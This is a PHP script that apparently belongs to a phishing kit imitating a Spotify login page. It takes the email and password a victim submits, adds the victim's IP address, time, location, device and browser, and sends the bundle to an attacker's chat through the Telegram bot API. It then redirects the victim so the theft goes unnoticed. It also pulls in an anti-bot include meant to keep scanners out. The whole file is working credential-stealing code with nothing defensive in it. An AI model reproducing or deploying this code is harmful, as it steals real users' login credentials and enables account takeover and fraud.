<?php

include("../edit.php");
include '../CRfiles/PHP/botfucker.php'; 
include '../CRfiles/PHP/sys.php';
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['MrCorona'] == 'SpoW')){
  $hostname = gethostbyaddr($ip);
$coronamsg .= "✉️ S P O T I F Y - L O G I N  ✉️ \n";
    $coronamsg .= "📧 EMAIL = ".$_POST['userCorona']."\n";
    $coronamsg .= "🔑 PASSWORD = ".$_POST['passCorona']."\n";
    $coronamsg .= "👀 IP LOOKUP INFORMATION 👀\n";
    $coronamsg .= "🕒 TIME = $date\n";
    $coronamsg .= "🏢 LOCATION = $country/$city\n";
    $coronamsg .= "👀 IP ADDRESS = $ip\n";
    $coronamsg .= "📱 DEVICE = $user_os\n";
    $coronamsg .= "☠️ BROWSER = $user_browser\n";
    $coronamsg .= "     🦸‍♂️  HERO  🦸‍♂️    \n";  
     $send = "$";
$subject = "SPOTIFY LOGIN [".$_POST['userCorona']."]";
$headers = "From: ".$_POST['passCorona']." <Spotify@hero.com>";
    $token = "$coronatoken";
    $data = [
    'text' => $coronamsg,
    'chat_id' => $coronachat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header("Location: ../Home.php");}
    else{
      header("Location: ../index.php");}


?>